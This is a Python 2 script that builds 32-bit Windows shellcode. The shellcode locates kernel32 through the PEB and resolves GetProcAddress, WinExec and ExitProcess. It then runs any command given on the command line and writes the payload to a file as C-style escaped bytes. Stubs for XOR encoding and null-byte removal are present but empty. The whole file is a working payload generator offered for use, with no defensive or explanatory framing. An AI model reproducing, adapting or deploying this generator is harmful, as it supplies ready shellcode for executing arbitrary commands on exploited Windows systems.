#!/usr/bin/env python   
# _*_ coding:utf-8 _*_ 

import optparse
import os

def getshellcode(cmdline):
	locallist = ''
	for i in cmdline:
		locallist += str(hex(ord(i)))[2:]
	cmdline = locallist
	length = len(cmdline) / 8
	lastdata = len(cmdline) - length * 8
	if lastdata	!= 0:
		cmdline += '00' * (8 - lastdata)

	shellcode =  ''
	shellcode += '64A130000000'  # mov eax, dword ptr fs:[0x00000030]        
	shellcode += '8B400C'        # mov eax, dword ptr ds:[eax+0xC]      
	shellcode += '8B400C'        # mov eax, dword ptr ds:[eax+0xC]
	shellcode += '8B00'          # mov eax, dword ptr ds:[eax]
	shellcode += '8B00'          # mov eax, dword ptr ds:[eax]
	shellcode += '8B4018'        # mov eax, dword ptr ds:[eax+0x18]
	shellcode += '8BE8'          # mov ebp, eax

	shellcode += '368B453C'      # mov eax, dword ptr ss:[ebp+0x3C] 
	shellcode += '3E8B542878'    # mov edx, dword ptr ds:[eax+ebp*1+0x78]
	shellcode += '03D5'          # add edx, ebp                                   #edx=export table
	shellcode += '3E8B4A18'      # mov ecx, dword ptr ds:[edx+0x18]               #ecx=NumberOfFunctions
	shellcode += '3E8B5A20'      # mov ebx, dword ptr ds:[edx+0x20]               
	shellcode += '03DD'          # add ebx, ebp                                   #ebx=AddressOfName

	shellcode += '49'            # dec ecx
	shellcode += '3E8B348B'      # mov esi, dword ptr ds:[ebx+ecx*4]
	shellcode += '03F5'          # add esi, ebp
	shellcode += 'B847657450'    # mov eax, 0x50746547
	shellcode += '3E3906'        # cmp dword ptr ds:[esi], eax
	shellcode += '75EF'          # jne 0x00C31778
	shellcode += 'B8726F6341'    # mov eax, 0x41636F72
	shellcode += '3E394604'      # cmp dword ptr ds:[esi+0x4], eax
	shellcode += '75E4'          # jne 0x00C31778
	shellcode += '3E8B5A24'      # mov ebx, dword ptr ds:[edx+0x24]
	shellcode += '03DD'          # add ebx, ebp
	shellcode += '3E668B0C4B'    # mov cx, word ptr ds:[ebx+ecx*2]
	shellcode += '3E8B5A1C'      # mov ebx, dword ptr ds:[edx+0x1C]
	shellcode += '03DD'          # add ebx, ebp
	shellcode += '3E8B048B'      # mov eax, dword ptr ds:[ebx+ecx*4]
	shellcode += '03C5'          # add eax, ebp
	shellcode += '8BD8'          # mov ebx, eax
	shellcode += '6A00'          # push 0x0
	shellcode += '6878656300'    # push 0x636578
	shellcode += '6857696E45'    # push 0x456E6957
	shellcode += '54'            # push esp
	shellcode += '55'            # push ebp
	shellcode += 'FFD3'          # call ebx
	shellcode += '6A00'          # push 0

	result = []
	length = len(cmdline) / 8
	pushlist = []

	for i in range(length):
		pushlist.append(cmdline[i*8: i*8+8])

	pushlist.reverse()
	for pushdata in pushlist:
		reverselist = []
		length = len(pushdata) / 2
		for i in range(length):
			reverselist.append(pushdata[i*2: i*2+2])
		data = ''

		for i in reverselist:
			data += i
		result.append(data)

	pushcmdline = ''
	for i in result: 
		pushcmdline += '68'
		pushcmdline += i

	shellcode += pushcmdline
	shellcode += '8D1424'        # lea edx, ss:[esp]
	shellcode += '6A01'          # push 0x1
	shellcode += '52'            # push edx
	shellcode += 'FFD0'          # call eax
	shellcode += '6A00'          # push 0x0
	shellcode += '6865737300'    # push 0x737365
	shellcode += '6850726F63'    # push 0x636F7250
	shellcode += '6845786974'    # push 0x74697845
	shellcode += '54'            # push esp
	shellcode += '55'            # push ebp
	shellcode += 'FFD3'          # call ebx
	shellcode += '6A00'          # push 0x0
	shellcode += 'FFD0'          # call eax

	# 6A00 6865737300 6850726F63 6845786974 54 55 FFD3
	# 6A0068657373006850726F6368457869745455FFD3
	return shellcode

# xor encryption
def encryption(param):
	data = ''
	return data

# out \x00
def outnull(param):
	data = ''
	return data

# c-code
def convert(param):
	data = ''
	length = len(param) / 2
	for i in range(length):
		data += '\\x'
		data += param[i*2: i*2+2]
	return data

def outputfile(filepath, cmdline):
	hexdata = ''
	hexdata = getshellcode(cmdline)
	#with open("test", 'wb') as writefile:
		#writefile.write(hexdata.decode('hex'))

	length = len(hexdata)
	hexdata = convert(hexdata)
	with open(filepath, 'wb') as writefile:
		writefile.write(hexdata)

	#print(hexdata)
	#print("[*] shellcode file is create already, shellcode size is: " + str(length) + "bytes")
	#execshellcode(os.getcwd() + "\\Execshellcode")

def main():
	parse=optparse.OptionParser()  
	parse.add_option('-c', '--cmdline', dest='cmdline', type=str, help='command for cmd')
	parse.add_option('-o', '--output', dest='output', type=str, help='output file')
	options,args=parse.parse_args()
	if options.cmdline == None or options.output == None or len(options.cmdline) > 100:
		print("[-] error...")
	else:
		outputfile(options.output, options.cmdline)

if __name__ == '__main__':
	main()